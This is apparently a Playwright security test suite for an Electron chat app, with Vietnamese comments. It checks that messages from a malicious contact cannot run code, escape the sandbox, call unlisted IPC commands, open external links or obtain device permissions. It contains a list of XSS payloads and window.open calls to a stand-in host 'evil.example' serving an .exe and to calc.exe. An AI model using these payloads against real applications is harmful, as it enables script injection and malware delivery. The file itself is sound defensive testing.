// Kiểm thử TẤN CÔNG: kẻ gian (một "bạn bè" độc hại hoặc nội dung lạ) có lợi dụng được app để chạy mã trên máy không?
// Chạy trên app thật (bản dev, hoặc bản đóng gói với YC_UI_EXE) với stack test riêng.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { _electron } from "playwright-core";
import electronPath from "electron";
import { ChatCore } from "../core/chat-core.js";
import { startApi, createInvite, emailOtp, waitFor, sleep } from "./stack.js";

const APP_DIR = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const run = Date.now().toString(36).slice(-5);
const PW = "Mat-khau-du-dai-sec";
let api, app, B, aMe, contacts, chat;

async function newUser(core, nick) {
  const email = `${nick.toLowerCase()}@example.test`;
  const r = await core.registerStart(createInvite(), "email", email);
  const v = await core.registerVerify(r.registrationId, await emailOtp(email));
  await core.registerComplete(v.verificationToken, PW, nick);
  return core.me;
}
const pageFor = (re) => waitFor(() => app.windows().find((w) => re.test(w.url())), 15000, "cửa sổ " + re);

before(async () => {
  api = await startApi(18083);
  const A = new ChatCore({ apiBase: api.base, insecureTls: true });
  B = new ChatCore({ apiBase: api.base, insecureTls: true });
  aMe = await newUser(A, `SecA_${run}`);
  await newUser(B, `SecB_${run}`);
  await A.sendFriendRequest(B.me.userId);
  await B.decideRequest((await B.listRequests()).incoming[0].requestId, "accept");
  await A.logout();
  await B.connect();
  app = await _electron.launch({
    executablePath: process.env.YC_UI_EXE ?? electronPath, args: process.env.YC_UI_EXE ? [] : [APP_DIR],
    env: { ...Object.fromEntries(Object.entries(process.env).filter(([k]) => k !== "ELECTRON_RUN_AS_NODE")), YC_API_BASE: api.base, YC_DEV_INSECURE_TLS: "1", YC_USER_DATA: mkdtempSync(join(tmpdir(), "yc-sec-")) },
  });
  const login = await app.firstWindow();
  await login.fill("#li-id", aMe.nick);
  await login.fill("#li-pw", PW);
  await login.click("#li-submit");
  contacts = await pageFor(/contacts\.html/);
  await contacts.waitForSelector(`.contact[data-user="${B.me.userId}"]`);
  // Ghi lại mọi lần app định mở trình duyệt ngoài
  await app.evaluate(({ shell }) => { globalThis.__ext = []; shell.openExternal = async (u) => { globalThis.__ext.push(u); }; });
});
after(async () => { await app?.close().catch(() => {}); await B?.disconnect(); api?.stop(); });

const PAYLOADS = [
  `<img src=x onerror="window.__pwned='img'">`,
  `<script>window.__pwned='script'</script>`,
  `<svg onload="window.__pwned='svg'"></svg>`,
  `<iframe src="javascript:parent.__pwned='iframe'"></iframe>`,
  `"><a href="javascript:window.__pwned='a'">bấm</a>`,
  `\u202Egnp.exe :) <style>*{display:none}</style>`,
];

test("1. Tin nhắn/dòng trạng thái chứa mã HTML/JS độc hại: chỉ hiện chữ, không chạy, không chèn phần tử", async () => {
  await B.setPresence("online", PAYLOADS[0]);
  for (const p of PAYLOADS) await B.sendMessage(aMe.userId, p);
  chat = await pageFor(/chat\.html/); // cửa sổ tự bật khi có tin
  await chat.locator(".msg.in").nth(PAYLOADS.length - 1).waitFor({ timeout: 8000 });
  await sleep(500);
  for (const page of [chat, contacts]) {
    assert.equal(await page.evaluate(() => window.__pwned), undefined);
    assert.equal(await page.locator("#history img, #history script, #history iframe, #history a, #history style, #list img, #list script").count(), 0);
  }
  // Mã độc hiện ra dưới dạng CHỮ (một số đoạn như ":p" trong "javascript:parent" được đổi thành smiley — vô hại).
  const shown = (await chat.locator(".msg.in .body").allTextContents()).join(" | ");
  for (const frag of ["<img src=x onerror=", "<script>window.__pwned", "<svg onload=", "<iframe src=\"javascript", '<a href="javascript', "<style>*{display:none}</style>"]) {
    assert.ok(shown.includes(frag), "phải hiện dưới dạng chữ: " + frag);
  }
  assert.ok((await contacts.locator(`.contact[data-user="${B.me.userId}"] .st`).textContent()).includes("<img"));
});

test("2. Trang giao diện không có quyền Node/hệ điều hành (sandbox + contextIsolation)", async () => {
  for (const page of [chat, contacts]) {
    const r = await page.evaluate(() => ({
      require: typeof require, process: typeof process, module: typeof module, Buffer: typeof Buffer,
      yc: Object.keys(window.yc).sort().join(","),
    }));
    assert.deepEqual(r, { require: "undefined", process: "undefined", module: "undefined", Buffer: "undefined", yc: "app,call,on" });
  }
});

test("3. Kênh IPC chỉ nhận đúng danh sách lệnh cho phép", async () => {
  for (const [kind, name] of [["call", "constructor"], ["call", "api"], ["call", "connect"], ["call", "__proto__"], ["call", "useSession"], ["app", "evil"], ["app", "eval"]]) {
    const err = await chat.evaluate(([k, n]) => window.yc[k](n, "x").then(() => null, (e) => e.message), [kind, name]);
    assert.ok(err, `${kind}.${name} phải bị từ chối`);
  }
});

test("4. Không tự mở trình duyệt/liên kết ngoài, không điều hướng khỏi app", async () => {
  await chat.evaluate(() => { window.open("https://evil.example/tai-mã-độc.exe"); window.open("file:///C:/Windows/System32/calc.exe"); });
  await chat.evaluate(() => { location.href = "https://evil.example/"; }).catch(() => {});
  await sleep(800);
  assert.deepEqual(await app.evaluate(() => globalThis.__ext), []);
  assert.match(chat.url(), /^file:.*chat\.html/);
  assert.equal(app.windows().filter((w) => /evil|calc/.test(w.url())).length, 0);
});

test("5. Trang không xin được camera, micro, vị trí, thông báo, đọc clipboard (từ chối mặc định)", async () => {
  const r = await chat.evaluate(async () => {
    const out = {};
    out.media = await navigator.mediaDevices.getUserMedia({ audio: true }).then(() => "granted", (e) => "denied:" + e.name);
    out.geo = await new Promise((res) => navigator.geolocation.getCurrentPosition(() => res("granted"), (e) => res("denied:" + e.code), { timeout: 3000 }));
    out.notification = await Notification.requestPermission();
    out.clipboard = await navigator.clipboard.readText().then(() => "granted", (e) => "denied:" + e.name);
    return out;
  });
  assert.match(r.media, /^denied/);
  assert.match(r.geo, /^denied/);
  assert.notEqual(r.notification, "granted");
  assert.match(r.clipboard, /^denied/);
});
